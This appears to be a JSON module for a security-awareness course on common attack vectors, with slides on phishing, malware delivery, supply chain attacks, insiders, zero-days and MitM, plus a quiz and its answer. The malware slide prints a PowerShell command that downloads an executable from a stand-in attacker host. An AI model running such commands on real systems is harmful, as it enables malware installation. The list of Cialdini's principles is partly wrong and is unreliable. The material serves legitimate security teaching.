@@ -1,0 +1,89 @@
+{
+    "id": "learn_attack_vectors",
+    "topicId": "attack_vectors",
+    "topicTitle": "Common Attack Vectors",
+    "description": "Examine the most prevalent ways attackers breach systems, from social engineering to zero-days.",
+    "baseKP": 100,
+    "slides": [
+        {
+            "id": "av_1",
+            "type": "content",
+            "title": "Introduction to Attack Vectors",
+            "content": "# Attack Vectors 🏹\n\nAn **attack vector** is the path or means by which a hacker gains access to a computer or network server.\n\n> \"The chain is only as strong as its weakest link.\"\n\n## Most Common Vectors\n1.  **Email (Phishing):** The #1 entry point (>90% of breaches start here).\n2.  **Web:** Exploiting vulnerabilities in websites.\n3.  **Identity:** Stolen passwords/credentials.\n4.  **Supply Chain:** Compromising a trusted vendor.\n5.  **Insider:** Malicious or negligent employees."
+        },
+        {
+            "id": "av_2",
+            "type": "content",
+            "title": "Phishing Attacks",
+            "content": "# Phishing Attacks 🎣\n\nPhishing mimics a trustworthy source to trick users into revealing sensitive data or installing malware.\n\n## Types of Phishing\n- **Bulk Phishing:** Generic \"Your account is locked\" emails sent to millions.\n- **Spear Phishing:** Targeted at a specific person/company. Uses gathered intel.\n- **Whaling:** Targeting high-profile executives (CEO, CFO).\n- **Smishing:** SMS Phishing.\n- **Vishing:** Voice Phishing (Phone calls).\n\n> 🚩 **Red Flags:** Urgency (\"Act now!\"), mismatched URLs, grammar errors, requesting payments/passwords."
+        },
+        {
+            "id": "av_3",
+            "type": "content",
+            "title": "Phishing Link Analysis",
+            "content": "# Analyzing Phishing Links 🔬\n\nAttackers use tricks to hide their malicious URLs. Can you spot them?\n\n- **Typosquatting:** `goggle.com` vs `google.com`.\n- **Homoglyphs:** `appIe.com` (Capital 'i') vs `apple.com` (Lowercase 'L').\n- **Subdomain Abuse:** `google.com.security-check.xyz` (This is NOT Google! It is `xyz`).\n- **URL Shorteners:** `bit.ly/3xyz` hides the destination.\n- **Open Redirects:** `google.com/url?q=http://evil.com` (Looks like Google, redirects to Evil).\n\n```python\nfrom urllib.parse import urlparse\n\ndef analyze_url(url):\n    domain = urlparse(url).netloc\n    print(f\"Navigating to: {domain}\")\n    # If domain ends with '.xyz' or is IP address -> Suspicious\n\nanalyze_url(\"https://google.com.security-check.xyz/login\")\n# Output: Navigating to: google.com.security-check.xyz\n```"
+        },
+        {
+            "id": "av_4",
+            "type": "content",
+            "title": "Malware Delivery",
+            "content": "# Malware Delivery 📦\n\nHow does the virus actually get on the machine?\n\n## Common Methods\n1.  **Email Attachments:** Malicious Word Macros (`.docm`), PDFs, or ZIPs.\n2.  **Drive-by Download:** Visiting an infected website automatically downloads malware (exploits browser bugs).\n3.  **Trojanized Software:** \"Cracked\" games or software bundles containing malware.\n4.  **Physical Media:** Infected USB drive dropped in parking lot (The \"USB Drop\" attack).\n\n## LolBins (Living off the Land Binaries)\nAttackers use built-in tools (PowerShell, CMD, WMI) to download malware to avoid AV detection.\n`powershell -c \"iwr -uri http://evil.com/malware.exe -OutFile c:\\temp\\m.exe\"`"
+        },
+        {
+            "id": "av_5",
+            "type": "content",
+            "title": "Supply Chain Attacks",
+            "content": "# Supply Chain Attacks ⛓️\n\nInstead of attacking the castle directly, poison the water supply.\n\n## How it works\nAttackers compromise a **trusted third-party vendor** or software library used by the target.\n\n## Famous Examples\n- **SolarWinds (2020):** Attackers hacked SolarWinds Orion (monitoring software). Malicious code was pushed out in a legitimate update signed by SolarWinds. 18,000 companies installed the backdoor.\n- **Kaseya:** MSP software compromised to deploy ransomware to customers.\n- **NPM/PyPI:** Attackers publish malicious packages with names similar to popular ones (`request` vs `requests`)."
+        },
+        {
+            "id": "av_6",
+            "type": "content",
+            "title": "Insider Threats",
+            "content": "# Insider Threats 🏢\n\nThe threat is coming from *inside* the building!\n\n## Types\n1.  **Malicious Insider:** Intentional sabotage or theft (Espionage, Revenge).\n    - *Mitigation:* Least Privilege, Monitoring, Background checks.\n2.  **Negligent Insider:** Accidental error (Lost laptop, clicked phishing link, misconfigured AWS bucket).\n    - *Mitigation:* Training, DLP (Data Loss Prevention).\n3.  **Compromised Insider:** Account taken over by attacker (Credential theft).\n    - *Mitigation:* MFA, User Behavior Analytics (UEBA).\n\n> ⚠️ **Fact:** Negligent insiders cause more breaches than malicious ones."
+        },
+        {
+            "id": "av_7",
+            "type": "content",
+            "title": "Zero-day Exploits",
+            "content": "# Zero-day Exploits 0️⃣\n\nA vulnerability that is **unknown to the vendor** (or has no patch available).\n\n- **Day 0:** The day the vendor learns about it.\n- **Zero-Day Attack:** Attack happening *before* the patch exists.\n\n## The Market\nZero-days are bought and sold. A zero-day for iPhone (remote jailbreak) can sell for **$2 Million+** to firms like Zerodium.\n\n## Defense\nSince there is no patch/signature:\n- **Behavioral Analysis:** Does this Word doc trying to launch PowerShell look normal? No.\n- **Sandboxing:** Detonate unknown files in isolation.\n- **Microsegmentation:** Limit the blast radius."
+        },
+        {
+            "id": "av_8",
+            "type": "quiz",
+            "title": "Vector Quiz",
+            "content": "Test your vector knowledge.",
+            "quizQuestion": "An attacker targets the CEO of a company with a carefully crafted email about 'Quarterly Financials'. What type of attack is this?",
+            "quizOptions": [
+                "Bulk Phishing",
+                "Whaling",
+                "Vishing",
+                "Watering Hole"
+            ],
+            "correctOptionIndex": 1
+        },
+        {
+            "id": "av_9",
+            "type": "content",
+            "title": "Social Engineering (Human Vector)",
+            "content": "# Social Engineering 🗣️\n\nHacking humans is often easier than hacking computers.\n\n## Techniques\n- **Pretexting:** Creating a fake scenario/identity (\"Hi, I'm calling from IT support, I need your password to fix the virus\").\n- **Tailgating:** Following someone into a secure area.\n- **Baiting:** Leaving something enticing (USB labeled \"Payroll\") for victims to find.\n- **Quid Pro Quo:** Offering a benefit in exchange for info (\"I'll give you a chocolate bar if you tell me your password\").\n\n## Principles of Influence (Cialdini)\nAuthority, Intimacy, Scarcity, Urgency, Consistency, Reciprocity."
+        },
+        {
+            "id": "av_10",
+            "type": "content",
+            "title": "Watering Hole Attacks",
+            "content": "# Watering Hole Attacks 🦁\n\n**Strategy:** If you can't hack the target, hack what they visit.\n\n1.  **Profile Target:** Attackers see that employees of \"Company X\" visit an industry forum \"DevForum.com\".\n2.  **Compromise Site:** Hack \"DevForum.com\" and inject malware.\n3.  **Wait:** When Company X employees visit the forum, they get infected.\n\n> 💡 **Name Origin:** Predators waiting by a watering hole for prey to come to them."
+        },
+        {
+            "id": "av_11",
+            "type": "content",
+            "title": "Man-in-the-Middle (MitM)",
+            "content": "# Man-in-the-Middle (MitM) 👂\n\nAttacker intercepts communication between two parties.\n\n## Scenario\nUser (Alice) <---> [Attacker] <---> Server (Bob)\n- Alice thinks she is talking to Bob.\n- Attacker relays messages but steals/modifies the data (passwords, credit cards).\n\n## Vectors\n- **Public WiFi:** Attacker sets up a Rogue Access Point (\"Free Airport WiFi\").\n- **ARP Spoofing:** Local network interception.\n- **SSL Stripping:** Downgrading HTTPS to HTTP.\n\n**Defense:** HTTPS (End-to-end encryption) and VPNs."
+        },
+        {
+            "id": "av_12",
+            "type": "content",
+            "title": "Module Summary",
+            "content": "# Module Summary 🎓\n\nYou've explored how attackers get in. It's rarely \"Magic\", it's usually a process.\n\n## Recap\n- **Phishing:** The King of vectors. Tricking the user.\n- **Malware:** Delivered via email, web, or USB.\n- **Supply Chain:** Trust is a vulnerability.\n- **Insiders:** The threat within.\n- **Zero-Day:** The unpatchable threat (until Day 1).\n\n## What's Next?\nNow that we know the paths, let's look at the holes. Next module: **Vulnerability Types**."
+        }
+    ]
+}
